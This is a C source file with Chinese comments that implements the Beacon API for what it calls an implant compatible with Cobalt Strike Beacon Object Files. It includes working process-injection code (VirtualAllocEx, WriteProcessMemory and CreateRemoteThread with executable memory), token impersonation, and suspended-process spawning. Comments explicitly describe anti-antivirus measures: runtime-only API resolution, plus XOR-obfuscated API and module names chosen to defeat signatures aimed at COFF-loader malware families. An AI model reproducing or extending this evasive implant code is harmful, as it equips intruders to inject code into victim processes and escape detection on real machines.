/*
 * csdev :: bof_api.c  --  Beacon API 实现 (原版 BOF 生态的 ABI 契约)
 * ==========================================================================
 * 免杀硬约束 (与 beacon2_ops.c 同风格): 本文件不新增任何静态导入。
 *   除 kernel32 既有的 LoadLibraryA / GetProcAddress / VirtualAlloc 等之外,
 *   全部 Windows API 一律运行期解析, 导入表不出现新 DLL。
 *
 * ---------------------------------------------------------------------------
 * 参数块字节序 —— 本实现最关键、最容易做错的一点
 * ---------------------------------------------------------------------------
 * 原版 bof_pack 打包的整数 / 短整数 / 长度前缀是 **大端 (big-endian)**, 不是小端。
 * 三条独立证据:
 *   1) CS 4.7 客户端 common/Packer.java 的 addInt/addShort 用
 *      ByteBuffer.putInt(0,n) 直接写 ByteBuffer.wrap() 出来的缓冲; Java 的
 *      ByteBuffer.wrap() 默认 order() == BIG_ENDIAN, 且 &bof_pack
 *      (aggressor/bridges/BeaconBridge.java) 从未调用 packer.little()。
 *      实测复刻 Packer 输出: addInt(0x01020304) -> "01 02 03 04"。
 *      (对照: pe/OBJExecutable.java 的内部重定位流显式调用 little() -> 小端,
 *       说明 CS 开发者清楚这两条流字节序不同, 并非疏漏。)
 *   2) 官方 BOF 包装类 beacon.bof 包 (RegistryQuery 等) 同样不调用 little()。
 *   3) 第三方兼容层 NetSPI/BOF-PE 的 beacon.cpp 在 BeaconDataInt /
 *      BeaconDataShort / BeaconDataExtract / BeaconFormatInt 中一律调用
 *      swap_endianess(), 注释写明 "built off of the beacon.h file provided
 *      to build for CS"。
 *
 * 因此: 本文件默认按大端解析。若确需小端, 编译时定义
 *   -DBOF_ARGS_LITTLE_ENDIAN=1
 * 但那样原版 sleeve 里的 .o 参数会全部读错。详见交付报告的不确定项清单。
 * ==========================================================================
 */
#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>

#include "bof_api.h"
#include "cs_obf.h"
#include "cs_obf_names.h"

#if defined(__GNUC__)
#pragma GCC diagnostic ignored "-Wstrict-aliasing"
#endif

#ifndef BOF_ARGS_LITTLE_ENDIAN
#define BOF_ARGS_LITTLE_ENDIAN 0
#endif

/* ============================================================== 数据结构 */
/* 字段布局与 CS 提供、社区广泛转引的 beacon.h 完全一致。
 * 注意 datap 与 formatp 的字段布局相同, 但语义不同:
 *   datap.length   = 剩余可读字节数
 *   formatp.length = 已写入字节数
 * 两者都只有这 4 个字段 —— BOF 会在自己栈上声明它们, 所以绝不能在结构里
 * 追加任何私有字段, 否则会踩坏调用方的栈。 */

typedef struct {
    char *original;   /* 原始缓冲 [用于重置/释放]           */
    char *buffer;     /* 当前读指针                         */
    int   length;     /* 剩余可读长度                       */
    int   size;       /* 原始总长度                         */
} datap;

typedef struct {
    char *original;   /* 原始缓冲 [用于重置/释放]           */
    char *buffer;     /* 当前写指针                         */
    int   length;     /* 已写入长度                         */
    int   size;       /* 缓冲容量                           */
} formatp;

/* ---------------------------------------------------------------- 字节序 */

static unsigned int rd32(const char *p)
{
    const unsigned char *b = (const unsigned char *)p;
#if BOF_ARGS_LITTLE_ENDIAN
    return ((unsigned int)b[3] << 24) | ((unsigned int)b[2] << 16) |
           ((unsigned int)b[1] << 8)  | (unsigned int)b[0];
#else
    return ((unsigned int)b[0] << 24) | ((unsigned int)b[1] << 16) |
           ((unsigned int)b[2] << 8)  | (unsigned int)b[3];
#endif
}

static unsigned int rd16(const char *p)
{
    const unsigned char *b = (const unsigned char *)p;
#if BOF_ARGS_LITTLE_ENDIAN
    return ((unsigned int)b[1] << 8) | (unsigned int)b[0];
#else
    return ((unsigned int)b[0] << 8) | (unsigned int)b[1];
#endif
}

static void wr32(char *p, unsigned int v)
{
    unsigned char *b = (unsigned char *)p;
#if BOF_ARGS_LITTLE_ENDIAN
    b[0] = (unsigned char)(v & 0xFF); b[1] = (unsigned char)((v >> 8) & 0xFF);
    b[2] = (unsigned char)((v >> 16) & 0xFF); b[3] = (unsigned char)((v >> 24) & 0xFF);
#else
    b[0] = (unsigned char)((v >> 24) & 0xFF); b[1] = (unsigned char)((v >> 16) & 0xFF);
    b[2] = (unsigned char)((v >> 8) & 0xFF);  b[3] = (unsigned char)(v & 0xFF);
#endif
}

/* ================================================================ 输出汇 */

static char        *g_sink_buf;
static unsigned int g_sink_cap;
static unsigned int g_sink_len;

void bof_sink_begin(char *buf, unsigned int cap)
{
    g_sink_buf = buf;
    g_sink_cap = cap;
    g_sink_len = 0;
}

unsigned int bof_sink_end(void)
{
    unsigned int n = g_sink_len;
    g_sink_buf = NULL;
    g_sink_cap = 0;
    g_sink_len = 0;
    return n;
}

unsigned int bof_sink_write(const char *data, unsigned int len)
{
    unsigned int room;

    if (!g_sink_buf || !data || len == 0) return 0;

    room = (g_sink_len < g_sink_cap) ? (g_sink_cap - g_sink_len) : 0u;
    if (room > len) room = len;
    if (room) memcpy(g_sink_buf + g_sink_len, data, room);
    g_sink_len += room;       /* 溢出的部分被丢弃, outlen 反映实际落盘字节数 */
    return room;
}

static void sink_puts(const char *s)
{
    unsigned int n = 0;
    if (!s) return;
    while (s[n]) n++;
    bof_sink_write(s, n);
}

/* =========================================================== Windows API */
/* 全部运行期解析: 模块句柄按名字缓存 (上限 16 个, 远超实际需要)。 */

#define WAPI_MOD_MAX 24

typedef struct {
    char    name[32];
    HMODULE mod;
} wapi_mod;

static wapi_mod g_mods[WAPI_MOD_MAX];
static int      g_mod_n;

static HMODULE wapi_module(const char *dll)
{
    char         full[32];
    unsigned int k = 0;
    int          i;

    /* 先把名字归一化成 "XXX.dll" —— 缓存键与加载都使用归一化后的名字,
     * 否则 "ADVAPI32" 与 "ADVAPI32.dll" 会被当成两个条目, 缓存迅速耗尽。 */
    while (dll[k] && k < 20) { full[k] = dll[k]; k++; }
    if (!(k >= 4 && full[k - 4] == '.')) {
        const char *ext = ".dll";
        while (*ext && k < sizeof(full) - 1) full[k++] = *ext++;
    }
    full[k] = 0;

    for (i = 0; i < g_mod_n; i++) {
        if (strcmp(g_mods[i].name, full) == 0) return g_mods[i].mod;
    }

    if (g_mod_n >= WAPI_MOD_MAX) return NULL;      /* 缓存满: 拒绝, 不静默复用 */

    g_mods[g_mod_n].mod = LoadLibraryA(full);
    if (!g_mods[g_mod_n].mod) return NULL;

    k = 0;
    while (full[k] && k < sizeof(g_mods[g_mod_n].name) - 1) {
        g_mods[g_mod_n].name[k] = full[k]; k++;
    }
    g_mods[g_mod_n].name[k] = 0;
    g_mod_n++;
    return g_mods[g_mod_n - 1].mod;
}

/* 解析 <MODULE>$<FUNC> 形式的 Windows API 符号。模块句柄缓存复用,
 * 避免每次重定位都增加一次 LoadLibrary 引用计数。 */
void *bof_resolve_winapi(const char *mod, const char *func)
{
    HMODULE      h;
    char         fnbuf[128];
    unsigned int k = 0;
    void        *fn;

    h = wapi_module(mod);
    if (!h) return NULL;

    /* 剥离 x86 stdcall 的 @N 修饰 */
    while (func[k] && func[k] != '@' && k < sizeof(fnbuf) - 1) {
        fnbuf[k] = func[k];
        k++;
    }
    fnbuf[k] = 0;

    fn = (void *)GetProcAddress(h, fnbuf);
    if (!fn && fnbuf[0] == '_') fn = (void *)GetProcAddress(h, fnbuf + 1);
    return fn;
}

/* 常用 API 指针, 首次使用时解析 */
static void *k_GetTokenInformation;
static void *k_OpenProcessToken;
static void *k_SetThreadToken;
static void *k_RevertToSelf;
static void *k_MultiByteToWideChar;
static void *k_VirtualProtect;
static void *k_VirtualFree;
static void *k_CreateProcessA;
static void *k_CreateProcessW;
static void *k_VirtualAllocEx;
static void *k_WriteProcessMemory;
static void *k_CreateRemoteThread;
static void *k_OpenProcess;

static void *kapi(const char *name, void **cache)
{
    if (!*cache) {
        /* "kernel32.dll" 不落地明文: 见 cs_obf.h 的说明 */
        CS_OBF_TMP(mod, CS_ENC_kernel32_dll);
        *cache = (void *)GetProcAddress(GetModuleHandleA(mod), name);
    }
    return *cache;
}

/* ============================================================ 数据解析类 */

void BeaconDataParse(datap *parser, char *buffer, int size)
{
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

int BeaconDataInt(datap *parser)
{
    int v;
    if (!parser || parser->length < 4) return 0;
    v = (int)rd32(parser->buffer);
    parser->buffer += 4;
    parser->length -= 4;
    return v;
}

short BeaconDataShort(datap *parser)
{
    short v;
    if (!parser || parser->length < 2) return 0;
    v = (short)(unsigned short)rd16(parser->buffer);
    parser->buffer += 2;
    parser->length -= 2;
    return v;
}

/* 语义: 返回剩余未解析字节数 (与原版兼容层 BeaconDataLength 一致) */
int BeaconDataLength(datap *parser)
{
    return parser ? parser->length : 0;
}

/* 取一个 [4B 长度][数据] 块; 长度为大端 */
char *BeaconDataExtract(datap *parser, int *size)
{
    unsigned int len;
    char *data;

    if (!parser || parser->length < 4) return NULL;

    len = rd32(parser->buffer);
    parser->buffer += 4;
    parser->length -= 4;

    if (len > (unsigned int)parser->length) {   /* 越界: 拒绝并收敛状态 */
        parser->length = 0;
        return NULL;
    }

    data = parser->buffer;
    parser->buffer += len;
    parser->length -= (int)len;

    if (size) *size = (int)len;
    return data;
}

/* 取 size 字节裸数据 (无长度前缀)。签名由真实 BOF 的反汇编确证:
 * registry.x64.o 在 call 前执行 `mov %eax,%edx` 传入 len/2 作为第二参数。 */
char *BeaconDataPtr(datap *parser, int size)
{
    char *data;

    if (!parser || size < 0 || parser->length < size) return NULL;

    data = parser->buffer;
    parser->buffer += size;
    parser->length -= size;
    return data;
}

/* ============================================================== 输出类 */

void BeaconOutput(int type, char *data, int len)
{
    (void)type;                      /* 类型仅用于服务端着色, 此处不区分 */
    if (data && len > 0) bof_sink_write(data, (unsigned int)len);
}

/* vsnprintf 需要一块临时区; BOF 串行执行, 静态缓冲即可 */
static char g_fmt_tmp[16 * 1024];

void BeaconPrintf(int type, const char *fmt, ...)
{
    va_list ap;
    int n;

    (void)type;
    if (!fmt) return;

    va_start(ap, fmt);
    n = vsnprintf(g_fmt_tmp, sizeof(g_fmt_tmp), fmt, ap);
    va_end(ap);

    if (n <= 0) return;
    if (n > (int)sizeof(g_fmt_tmp) - 1) n = (int)sizeof(g_fmt_tmp) - 1;
    bof_sink_write(g_fmt_tmp, (unsigned int)n);
}

/* ---------------------------------------------------------- formatp 族 */

void BeaconFormatAlloc(formatp *format, int maxsz)
{
    if (!format || maxsz <= 0) return;
    format->original = (char *)LocalAlloc(LPTR, (SIZE_T)maxsz + 1u);
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = format->original ? maxsz : 0;
}

void BeaconFormatReset(formatp *format)
{
    if (!format || !format->original) return;
    if (format->size > 0) memset(format->original, 0, (size_t)format->size + 1u);
    format->buffer = format->original;
    format->length = 0;
}

void BeaconFormatFree(formatp *format)
{
    if (!format) return;
    if (format->original) LocalFree(format->original);
    format->original = NULL;
    format->buffer   = NULL;
    format->length   = 0;
    format->size     = 0;
}

void BeaconFormatAppend(formatp *format, char *text, int len)
{
    if (!format || !text || len <= 0) return;
    if (!format->buffer || format->length + len > format->size) return;
    memcpy(format->buffer, text, (size_t)len);
    format->buffer += len;
    format->length += len;
}

void BeaconFormatPrintf(formatp *format, char *fmt, ...)
{
    va_list ap;
    int n;

    if (!format || !fmt || !format->buffer) return;

    va_start(ap, fmt);
    n = vsnprintf(format->buffer, (size_t)(format->size - format->length) + 1u, fmt, ap);
    va_end(ap);

    if (n <= 0) return;
    if (n > format->size - format->length) {          /* 截断: 收敛到容量 */
        n = format->size - format->length;
    }
    format->buffer += n;
    format->length += n;
}

char *BeaconFormatToString(formatp *format, int *size)
{
    if (!format) return NULL;
    if (size) *size = format->length;
    return format->original;
}

void BeaconFormatInt(formatp *format, int value)
{
    if (!format || !format->buffer) return;
    if (format->length + 4 > format->size) return;
    wr32(format->buffer, (unsigned int)value);
    format->buffer += 4;
    format->length += 4;
}

/* ======================================================== 进程 / 注入类 */
/* 说明: 这些入口按公开 beacon.h 的签名实现。BeaconInjectProcess /
 * BeaconInjectTemporaryProcess 采用"把 payload 写进目标并创建线程/APC"的
 * 常用约定, 未与原版逐字节比对 —— 见交付报告的不确定项清单。 */

BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken,
                                 STARTUPINFO *sInfo, PROCESS_INFORMATION *pInfo)
{
    typedef BOOL (WINAPI *fn_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    typedef BOOL (WINAPI *fnw_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                 BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    fn_t  cp;
    fnw_t cpw;
    STARTUPINFOA si;
    char   self[MAX_PATH];
    DWORD  n;

    (void)ignoreToken;
    if (!pInfo) return FALSE;

    /* 以自身映像为模板: 用当前进程可执行路径启动一个挂起的同名进程 */
    n = GetModuleFileNameA(NULL, self, sizeof(self));
    if (n == 0 || n >= sizeof(self)) return FALSE;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    if (sInfo) {
        memcpy(&si, sInfo, sizeof(STARTUPINFOA) < sizeof(STARTUPINFO) ?
               sizeof(STARTUPINFOA) : sizeof(STARTUPINFOA));
        si.cb = sizeof(si);
    }

    if (x86) {
        cpw = (fnw_t)kapi("CreateProcessW", &k_CreateProcessW);
        if (!cpw) return FALSE;
        (void)cpw;
        /* x86 子进程需要 WOW64 宿主, 此处不静默假装成功 */
        return FALSE;
    }

    cp = (fn_t)kapi("CreateProcessA", &k_CreateProcessA);
    if (!cp) return FALSE;

    return cp(self, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pInfo);
}

void BeaconGetSpawnTo(BOOL x86, char *buffer, int length)
{
    DWORD n;
    (void)x86;
    if (!buffer || length <= 1) return;
    n = GetModuleFileNameA(NULL, buffer, (DWORD)length);
    if (n == 0) buffer[0] = 0;
}

/* 把 payload 写入 hProc 并起线程。返回 TRUE 表示完成注入。 */
BOOL BeaconInjectProcess(HANDLE hProc, int pid, char *payload, int p_len,
                         int p_offset, char *arg, int a_len)
{
    typedef LPVOID (WINAPI *va_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL   (WINAPI *wpm_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
    typedef HANDLE (WINAPI *crt_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE,
                                   LPVOID, DWORD, LPDWORD);
    va_t  va;
    wpm_t wpm;
    crt_t crt;
    LPVOID remote;
    SIZE_T wrote = 0;
    HANDLE th;

    (void)pid;
    if (!payload || p_len <= 0) return FALSE;

    if (!hProc) {
        void *op;
        typedef HANDLE (WINAPI *op_t)(DWORD, BOOL, DWORD);
        CS_OBF_TMP(nm, CS_ENC_OpenProcess);
        op = kapi(nm, &k_OpenProcess);
        if (!op) return FALSE;
        hProc = ((op_t)op)(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
        if (!hProc) return FALSE;
    }

    {
        /* 注入三件套的名字不落地明文 —— 这三个连在一起就是"进程注入"的签名 */
        CS_OBF_TMP(n1, CS_ENC_VirtualAllocEx);
        CS_OBF_TMP(n2, CS_ENC_WriteProcessMemory);
        CS_OBF_TMP(n3, CS_ENC_CreateRemoteThread);
        va  = (va_t)kapi(n1, &k_VirtualAllocEx);
        wpm = (wpm_t)kapi(n2, &k_WriteProcessMemory);
        crt = (crt_t)kapi(n3, &k_CreateRemoteThread);
    }
    if (!va || !wpm || !crt) return FALSE;

    remote = va(hProc, NULL, (SIZE_T)p_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) return FALSE;

    if (!wpm(hProc, remote, payload, (SIZE_T)p_len, &wrote) || wrote != (SIZE_T)p_len) return FALSE;

    /* arg 放在 payload 之后; 入口约定: payload 起始即入口 */
    if (arg && a_len > 0) {
        LPVOID ra = va(hProc, NULL, (SIZE_T)a_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!ra) return FALSE;
        if (!wpm(hProc, ra, arg, (SIZE_T)a_len, &wrote)) return FALSE;
        (void)p_offset;
    }

    th = crt(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (!th) return FALSE;
    CloseHandle(th);
    return TRUE;
}

BOOL BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pInfo, char *payload, int p_len,
                                  int p_offset, char *arg, int a_len)
{
    if (!pInfo || !pInfo->hProcess) return FALSE;
    return BeaconInjectProcess(pInfo->hProcess, (int)pInfo->dwProcessId,
                               payload, p_len, p_offset, arg, a_len);
}

void BeaconCleanupProcess(PROCESS_INFORMATION *pInfo)
{
    if (!pInfo) return;
    if (pInfo->hThread)  { CloseHandle(pInfo->hThread);  pInfo->hThread = NULL; }
    if (pInfo->hProcess) { CloseHandle(pInfo->hProcess); pInfo->hProcess = NULL; }
}

/* ============================================================== 环境类 */

BOOL BeaconIsAdmin(void)
{
    typedef BOOL (WINAPI *opt_t)(HANDLE, DWORD, PHANDLE);
    typedef BOOL (WINAPI *gti_t)(HANDLE, int, LPVOID, DWORD, LPDWORD);
    opt_t opt;
    gti_t gti;
    HANDLE tok = NULL;
    unsigned char buf[64];
    DWORD  need = 0;
    BOOL   elevated = FALSE;

    opt = (opt_t)kapi("OpenProcessToken", &k_OpenProcessToken);
    gti = (gti_t)kapi("GetTokenInformation", &k_GetTokenInformation);
    if (!opt || !gti) return FALSE;

    if (!opt(GetCurrentProcess(), TOKEN_QUERY, &tok)) return FALSE;
    /* TokenElevation = 20 */
    if (gti(tok, 20, buf, (DWORD)sizeof(buf), &need)) {
        elevated = (*(DWORD *)buf) ? TRUE : FALSE;
    }
    CloseHandle(tok);
    return elevated;
}

BOOL BeaconUseToken(HANDLE token)
{
    typedef BOOL (WINAPI *stt_t)(HANDLE, HANDLE);
    stt_t stt = (stt_t)kapi("SetThreadToken", &k_SetThreadToken);
    if (!stt || !token) return FALSE;
    return stt(NULL, token);
}

void BeaconRevertToken(void)
{
    typedef BOOL (WINAPI *rts_t)(void);
    rts_t rts = (rts_t)kapi("RevertToSelf", &k_RevertToSelf);
    if (rts) rts();
}

/* 植入体没有原版的 "custom user data" 通道, 返回空指针并保持 errno=0 语义。
 * 见交付报告不确定项。 */
char *BeaconGetCustomUserData(void)
{
    return NULL;
}

/* 签名 (char *src, wchar_t *dst, int max) 与公开 beacon.h 一致;
 * 第三参数为 dst 的 **字节** 容量。返回写入的宽字符个数。 */
int toWideChar(char *src, wchar_t *dst, int max)
{
    typedef int (WINAPI *mb_t)(UINT, DWORD, LPCCH, int, LPWSTR, int);
    mb_t mb;

    if (!src || !dst || max < (int)sizeof(wchar_t)) return 0;

    mb = (mb_t)kapi("MultiByteToWideChar", &k_MultiByteToWideChar);
    if (!mb) return 0;

    /* CP_ACP = 0, MB_ERR_INVALID_CHARS = 8 */
    return mb(0u, 8u, src, -1, dst, max / (int)sizeof(wchar_t));
}

/* ========================================================= 数据存储类 */
/* 注意: CS 4.7 的 resources/bapi.txt (31 项) 中并不包含这四个名字 ——
 * 原版的 $data 存储位于 Aggressor 客户端侧, 而不是 beacon 进程内。
 * 这里按要求提供进程内实现, 语义按常用约定, 未与原版比对。 */

#define BOF_STORE_MAX 16

typedef struct {
    char  key[64];
    void *val;
    int   used;
} store_ent;

static store_ent g_store[BOF_STORE_MAX];

static store_ent *store_find(const char *key)
{
    int i;
    if (!key) return NULL;
    for (i = 0; i < BOF_STORE_MAX; i++) {
        if (g_store[i].used && strcmp(g_store[i].key, key) == 0) return &g_store[i];
    }
    return NULL;
}

void BeaconAddValue(char *key, void *value)
{
    store_ent *e;
    int i;

    if (!key) return;
    e = store_find(key);
    if (e) { e->val = value; return; }

    for (i = 0; i < BOF_STORE_MAX; i++) {
        if (!g_store[i].used) {
            unsigned int k = 0;
            while (key[k] && k < sizeof(g_store[i].key) - 1) {
                g_store[i].key[k] = key[k]; k++;
            }
            g_store[i].key[k] = 0;
            g_store[i].val = value;
            g_store[i].used = 1;
            return;
        }
    }
    /* 表满: 静默失败会掩盖问题, 这里选择不覆盖既有项 */
}

void *BeaconGetValue(char *key)
{
    store_ent *e = store_find(key);
    return e ? e->val : NULL;
}

void BeaconRemoveValue(char *key)
{
    store_ent *e = store_find(key);
    if (e) { e->used = 0; e->val = NULL; e->key[0] = 0; }
}

/* 与 BeaconGetValue 同义; 原版是否有此入口未确证 */
void *BeaconDataStoreGet(char *key)
{
    return BeaconGetValue(key);
}

/* ============================================================== 内存类 */
/* 三个薄封装。原版语义未逐字节比对 —— 见交付报告不确定项。 */

LPVOID BeaconVirtualAlloc(LPVOID addr, SIZE_T size, DWORD alloc_type, DWORD protect)
{
    return VirtualAlloc(addr, size, alloc_type, protect);
}

BOOL BeaconVirtualProtect(LPVOID addr, SIZE_T size, DWORD new_protect, LPDWORD old_protect)
{
    typedef BOOL (WINAPI *vp_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    vp_t vp = (vp_t)kapi("VirtualProtect", &k_VirtualProtect);
    if (!vp) return FALSE;
    return vp(addr, size, new_protect, old_protect);
}

BOOL BeaconVirtualFree(LPVOID addr, SIZE_T size, DWORD free_type)
{
    typedef BOOL (WINAPI *vf_t)(LPVOID, SIZE_T, DWORD);
    vf_t vf = (vf_t)kapi("VirtualFree", &k_VirtualFree);
    if (!vf) return FALSE;
    return vf(addr, size, free_type);
}

/* ============================================================== 错误类 */
/* BeaconErrorD / DD / NA 在 CS 4.7 的 bapi.txt 中存在, 但公开 beacon.h 未给出
 * 原型, 属于内部辅助。这里按退化约定实现: 向输出汇打印一条诊断。
 * 这三个函数极少被第三方 BOF 使用。见交付报告不确定项。 */

void BeaconErrorD(int v)
{
    char tmp[64];
    int n = snprintf(tmp, sizeof(tmp), "[!] BOF error D: %d\n", v);
    if (n > 0) bof_sink_write(tmp, (unsigned int)n);
}

void BeaconErrorDD(int a, int b)
{
    char tmp[64];
    int n = snprintf(tmp, sizeof(tmp), "[!] BOF error DD: %d %d\n", a, b);
    if (n > 0) bof_sink_write(tmp, (unsigned int)n);
}

void BeaconErrorNA(void)
{
    sink_puts("[!] BOF error NA\n");
}

/* ========================================================== API 符号表 */
/* 名字 -> 地址。bof.c 剥掉 __imp_ / __imp__ 前缀后按名字查这张表。 */

typedef struct {
    const unsigned char *name;  /* 编译期混淆(XOR), 见 cs_obf.h */
    unsigned int         nlen;
    void                *fn;
} bof_api_ent;

/* 名字走混淆表: 明文 API 名是 CoffLoader/MeterBof 家族判定的主要依据 */
#define API_ENT(n) { CS_ENC_##n, (unsigned int)(sizeof(CS_ENC_##n) - 1u), (void *)(n) }

static const bof_api_ent g_api[] = {
    API_ENT(BeaconDataParse),
    API_ENT(BeaconDataPtr),
    API_ENT(BeaconDataInt),
    API_ENT(BeaconDataShort),
    API_ENT(BeaconDataLength),
    API_ENT(BeaconDataExtract),

    API_ENT(BeaconOutput),
    API_ENT(BeaconPrintf),
    API_ENT(BeaconFormatAlloc),
    API_ENT(BeaconFormatReset),
    API_ENT(BeaconFormatFree),
    API_ENT(BeaconFormatAppend),
    API_ENT(BeaconFormatPrintf),
    API_ENT(BeaconFormatToString),
    API_ENT(BeaconFormatInt),

    API_ENT(BeaconSpawnTemporaryProcess),
    API_ENT(BeaconInjectProcess),
    API_ENT(BeaconInjectTemporaryProcess),
    API_ENT(BeaconCleanupProcess),
    API_ENT(BeaconGetSpawnTo),

    API_ENT(BeaconIsAdmin),
    API_ENT(BeaconUseToken),
    API_ENT(BeaconRevertToken),
    API_ENT(BeaconGetCustomUserData),
    API_ENT(toWideChar),

    API_ENT(BeaconAddValue),
    API_ENT(BeaconGetValue),
    API_ENT(BeaconRemoveValue),
    API_ENT(BeaconDataStoreGet),

    API_ENT(BeaconVirtualAlloc),
    API_ENT(BeaconVirtualProtect),
    API_ENT(BeaconVirtualFree),

    API_ENT(BeaconErrorD),
    API_ENT(BeaconErrorDD),
    API_ENT(BeaconErrorNA)
};

#define API_COUNT (sizeof(g_api) / sizeof(g_api[0]))

/* bapi.txt 的前 4 项 (LoadLibraryA / FreeLibrary / GetProcAddress /
 * GetModuleHandleA) 是 kernel32 导出, 但原版把它们作为 Beacon API 表的
 * 前 4 个槽位暴露给 BOF —— pe/BOFUtils.findInternalFunction() 就是按
 * bapi.txt 的行序返回索引, 所以这 4 个名字必须能查到, 否则 __imp_LoadLibraryA
 * / __imp_GetModuleHandleA 这类符号会解析失败 (真实 BOF dllload.x64.o 正是如此)。 */
static void *lookup_kernel32_builtin(const char *name)
{
    /* 前 4 个名字同样走混淆表(它们连在一起也是特征) */
    if (CS_OBF_MATCH(CS_ENC_LoadLibraryA, name))     return (void *)LoadLibraryA;
    if (CS_OBF_MATCH(CS_ENC_FreeLibrary, name))      return (void *)FreeLibrary;
    if (CS_OBF_MATCH(CS_ENC_GetProcAddress, name))   return (void *)GetProcAddress;
    if (CS_OBF_MATCH(CS_ENC_GetModuleHandleA, name)) return (void *)GetModuleHandleA;
    return NULL;
}

void *bof_api_lookup(const char *name)
{
    unsigned int i;
    void *fn;

    if (!name) return NULL;

    for (i = 0; i < API_COUNT; i++) {
        if (cs_obf_eq(g_api[i].name, g_api[i].nlen, name)) return g_api[i].fn;
    }

    fn = lookup_kernel32_builtin(name);
    if (fn) return fn;

    /* 回退: 真实 BOF 里还有一批不带模块前缀的 kernel32 / ntdll 符号
     * (__imp_AddVectoredExceptionHandler、__imp_GetCurrentThread 等),
     * 它们不在 bapi.txt 的 31 项里, 但原版加载器能解析。
     * 这里按 kernel32 -> ntdll 顺序兜底。模块名同样不落地明文。 */
    fn = bof_resolve_winapi("KERNEL32", name);
    if (fn) return fn;
    {
        CS_OBF_TMP(nd, CS_ENC_ntdll);
        return bof_resolve_winapi(nd, name);
    }
}
